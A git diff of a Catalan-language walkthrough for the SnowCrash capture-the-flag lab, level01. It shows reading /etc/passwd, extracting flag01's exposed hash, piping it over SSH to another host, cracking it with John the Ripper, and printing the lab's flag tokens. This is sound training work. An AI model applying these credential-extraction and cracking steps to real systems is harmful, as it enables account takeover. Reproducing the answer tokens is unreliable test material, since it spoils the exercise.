@@ -411,10 +411,141 @@ Don't forget to launch getflag !
 flag00@SnowCrash:~$ getflag
 Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
 ```
-### ENTRAR AL LEVEL01 AMB EL TOKEN OBTINGUT DE GETFLAG
+---
+### LEVEL01
+#### He fet els següents comandaments:
+##### ENTRAR al LEVEL01 amb el TOKEN obtingut de GETFLAG des de dins de la VM
 ```bash
 flag00@SnowCrash:~$ su level01
 Password: x24ti5gi3x0ol2eh4esiuxias
 level01@SnowCrash:~$ 
 ```
-### POSSIBLE PISTA LEVEL01 (cat /etc/passwd) -> (Observar la línia) flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash 
+##### ENTRAR al LEVEL01 amb el TOKEN obtingut de GETFLAG des de SSH
+```bash
+flag00@SnowCrash:~$ ssh level01@192.168.122.220 -p 4242
+Could not create directory '/home/flag/flag00/.ssh'.
+The authenticity of host '[192.168.122.220]:4242 ([192.168.122.220]:4242)' can't be established.
+ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/flag/flag00/.ssh/known_hosts).
+           _____                      _____               _     
+          / ____|                    / ____|             | |    
+         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
+          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
+          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+                                                        
+  Good luck & Have fun
+
+          
+level01@192.168.122.220's password: x24ti5gi3x0ol2eh4esiuxias
+level01@SnowCrash:~$
+```
+##### BUSCAR PASSWORDS
+```bash
+level01@SnowCrash:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+whoopsie:x:103:107::/nonexistent:/bin/false
+landscape:x:104:110::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+level00:x:2000:2000::/home/user/level00:/bin/bash
+level01:x:2001:2001::/home/user/level01:/bin/bash
+level02:x:2002:2002::/home/user/level02:/bin/bash
+level03:x:2003:2003::/home/user/level03:/bin/bash
+level04:x:2004:2004::/home/user/level04:/bin/bash
+level05:x:2005:2005::/home/user/level05:/bin/bash
+level06:x:2006:2006::/home/user/level06:/bin/bash
+level07:x:2007:2007::/home/user/level07:/bin/bash
+level08:x:2008:2008::/home/user/level08:/bin/bash
+level09:x:2009:2009::/home/user/level09:/bin/bash
+level10:x:2010:2010::/home/user/level10:/bin/bash
+level11:x:2011:2011::/home/user/level11:/bin/bash
+level12:x:2012:2012::/home/user/level12:/bin/bash
+level13:x:2013:2013::/home/user/level13:/bin/bash
+level14:x:2014:2014::/home/user/level14:/bin/bash
+flag00:x:3000:3000::/home/flag/flag00:/bin/bash
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+flag02:x:3002:3002::/home/flag/flag02:/bin/bash
+flag03:x:3003:3003::/home/flag/flag03:/bin/bash
+flag04:x:3004:3004::/home/flag/flag04:/bin/bash
+flag05:x:3005:3005::/home/flag/flag05:/bin/bash
+flag06:x:3006:3006::/home/flag/flag06:/bin/bash
+flag07:x:3007:3007::/home/flag/flag07:/bin/bash
+flag08:x:3008:3008::/home/flag/flag08:/bin/bash
+flag09:x:3009:3009::/home/flag/flag09:/bin/bash
+flag10:x:3010:3010::/home/flag/flag10:/bin/bash
+flag11:x:3011:3011::/home/flag/flag11:/bin/bash
+flag12:x:3012:3012::/home/flag/flag12:/bin/bash
+flag13:x:3013:3013::/home/flag/flag13:/bin/bash
+flag14:x:3014:3014::/home/flag/flag14:/bin/bash
+level01@SnowCrash:~$
+```
+###### Línia a destecar:
+```bash
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+```
+###### Copiar el hash en un fitxer si es disposés de permisos:
+```bash
+level01@SnowCrash:~$ echo "42hDRfypTqqnw" > hash.txt
+```
+###### Com no es disposa de permisos, copiar en el directori del host:
+```bash
+level01@SnowCrash:~$ echo '42hDRfypTqqnw' | ssh hostUser@192.168.1.19 "cat > /home/hostUser/Documents/42outerCore/snow_crash/snow_crash/level01/resources/hash.txt"
+Could not create directory '/home/user/level01/.ssh'.
+The authenticity of host '192.168.1.19 (192.168.1.19)' can't be established.
+ECDSA key fingerprint is e2:f0:85:bc:8c:d1:aa:83:cc:f7:be:05:84:4b:b0:ae.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/user/level01/.ssh/known_hosts).
+hostUser@192.168.1.19's password: myHostPassword
+level01@SnowCrash:~$
+```
+###### OBSERVACIÓ/RECORDATORI:
+```text
+pepe@pc:
+pepe -> nom de l'usuari
+pc -> nom de l'ordinador amfitrió o la seva IP 
+hostUser@hostName:
+hostUser@hostIP:
+whoami -> hostUser
+hostname -> hostName
+hostIP -> hostname -I / ip a
+```
+##### HOST: Fer servr John The Ripper per obtenir contrasenya del hash
+```bash
+hostUser@hostName:~/Documents/42outerCore/snow_crash/snow_crash/level01/resources$ ls
+hash.txt
+hostUser@hostName:~/Documents/42outerCore/snow_crash/snow_crash/level01/resources$ john --show hash.txt 
+?:abcdefg
+
+1 password hash cracked, 0 left
+hostUser@hostName:~/Documents/42outerCore/snow_crash/snow_crash/level01/resources$
+```
+##### Tornem a la VM:
+```bash
+level01@SnowCrash:~$ su flag01
+Password: abcdefg
+Don't forget to launch getflag !
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+flag01@SnowCrash:~$ 
+```
